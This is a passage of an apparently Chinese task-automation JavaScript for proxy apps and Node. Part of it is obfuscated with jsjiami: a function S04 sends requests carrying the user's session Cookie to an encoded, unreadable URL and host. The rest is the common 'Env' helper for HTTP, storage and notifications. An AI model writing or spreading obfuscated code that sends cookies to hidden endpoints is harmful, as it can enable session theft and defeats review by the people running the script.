_0x13c56f[_0x99f9('77','6rdt')](_0x5cbaad,_0x4d6503);},'yjyBR':_0x13c56f[_0x99f9('78','&x6q')],'xhlvs':_0x13c56f[_0x99f9('79','gHgN')],'qiLDh':function(_0x4610b6,_0x38360b){return _0x13c56f[_0x99f9('7a','kxu]')](_0x4610b6,_0x38360b);},'syPTx':_0x13c56f[_0x99f9('7b','fz5i')],'IaCSz':_0x13c56f[_0x99f9('7c','fZ8P')],'xKrmb':function(_0xe401a5,_0x4c29ea){return _0x13c56f[_0x99f9('7d','%RRi')](_0xe401a5,_0x4c29ea);},'TFabo':_0x13c56f[_0x99f9('7e','eibx')],'opmjr':_0x13c56f[_0x99f9('7f','3s3r')],'KhRAS':function(_0x5568dd,_0x51c241){return _0x13c56f[_0x99f9('80','fjuO')](_0x5568dd,_0x51c241);},'eIZAP':function(_0x41bbc5){return _0x13c56f[_0x99f9('81','JQ[R')](_0x41bbc5);}};if(_0x13c56f[_0x99f9('82','6e4P')](_0x13c56f[_0x99f9('83','DzuO')],_0x13c56f[_0x99f9('84','T*LY')])){_0x13c56f[_0x99f9('85','*5eW')](_0x24c5c1);}else{$[_0x99f9('86','eibx')](_0x47e8a6,async(_0x35f5b1,_0x542201,_0x270f79)=>{if(_0x2c9ab6[_0x99f9('87','6e4P')](_0x2c9ab6[_0x99f9('88','gHgN')],_0x2c9ab6[_0x99f9('89','fjuO')])){try{if(_0x2c9ab6[_0x99f9('8a','3s3r')](_0x2c9ab6[_0x99f9('8b','A5t3')],_0x2c9ab6[_0x99f9('8c','Ys5Y')])){if(_0x35f5b1){console[_0x99f9('41','6rdt')]($[_0x99f9('8d','JQ[R')]+_0x99f9('8e','BVVm'));}else{if(_0x2c9ab6[_0x99f9('8f','eibx')](_0x2c9ab6[_0x99f9('90','w]&!')],_0x2c9ab6[_0x99f9('91','Bw]V')])){_0x270f79=JSON[_0x99f9('92','&x6q')](_0x270f79);await _0x2c9ab6[_0x99f9('93','w]&!')](S04,_0x1c48b9);await $[_0x99f9('94','w]&!')](0xc8);}else{$[_0x99f9('95','3ks3')](e,_0x542201);}}}else{console[_0x99f9('96','kxu]')]($[_0x99f9('97','A5t3')]+_0x99f9('98','gsAy'));}}catch(_0x208f3e){$[_0x99f9('99','9(Mf')](_0x208f3e,_0x542201);}finally{_0x2c9ab6[_0x99f9('9a','*5eW')](_0x24c5c1);}}else{console[_0x99f9('9b','!qz)')]($[_0x99f9('9c','%RRi')]+_0x99f9('9d','3s3r'));}});}});}function S04(_0x150ca4){var _0x1e848f={'kRGgr':function(_0xb7548,_0x348a36){return _0xb7548===_0x348a36;},'IPoxt':_0x99f9('9e','2]ay'),'fSJzv':_0x99f9('9f','E*UC'),'Mjweq':function(_0x486704,_0x486c42){return _0x486704!==_0x486c42;},'iDyxG':_0x99f9('a0','&x6q'),'itEjs':_0x99f9('a1','fjuO'),'rcyfu':function(_0x227a33){return _0x227a33();},'redUy':_0x99f9('a2','6rdt'),'Pmgpv':_0x99f9('a3',')Oh)'),'IMMOA':_0x99f9('a4','jRCp'),'cMGDZ':_0x99f9('a5','E*UC'),'fvMoq':_0x99f9('a6','T9FS'),'wLkbb':_0x99f9('a7','3ks3')};let _0x1160b6={'url':_0x99f9('a8','6rdt'),'headers':{'Host':_0x1e848f[_0x99f9('a9','l4Ut')],'Connection':_0x1e848f[_0x99f9('aa','7qVV')],'Cookie':_0x150ca4,'Referer':_0x1e848f[_0x99f9('ab','gHgN')],'User-Agent':_0x1e848f[_0x99f9('ac','fZ8P')]}};return new Promise(_0x3019a5=>{var _0x352b54={'lKmky':function(_0x383245){return _0x1e848f[_0x99f9('ad','2]ay')](_0x383245);}};if(_0x1e848f[_0x99f9('ae','l4Ut')](_0x1e848f[_0x99f9('af','Ys5Y')],_0x1e848f[_0x99f9('b0','Bw]V')])){$[_0x99f9('b1','53G$')](_0x1160b6,async(_0x54ef2c,_0x5859fd,_0x5b8675)=>{if(_0x1e848f[_0x99f9('b2','6e4P')](_0x1e848f[_0x99f9('b3','Meuv')],_0x1e848f[_0x99f9('b4','3s3r')])){$[_0x99f9('b5','gHgN')](e,_0x5859fd);}else{try{if(_0x1e848f[_0x99f9('b6','Vp6n')](_0x1e848f[_0x99f9('b7','%RRi')],_0x1e848f[_0x99f9('b8','NG0^')])){if(_0x54ef2c){console[_0x99f9('b9','eLJ6')]($[_0x99f9('9c','%RRi')]+_0x99f9('ba','0E9d'));}else{_0x5b8675=JSON[_0x99f9('bb','JQ[R')](_0x5b8675);await $[_0x99f9('bc','QoDf')](0xc8);}}else{$[_0x99f9('bd','fjuO')](e,_0x5859fd);}}catch(_0x3e8900){$[_0x99f9('be','JQ[R')](_0x3e8900,_0x5859fd);}finally{_0x1e848f[_0x99f9('bf','*5eW')](_0x3019a5);}}});}else{_0x352b54[_0x99f9('c0','T9FS')](_0x3019a5);}});};_0xodk='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}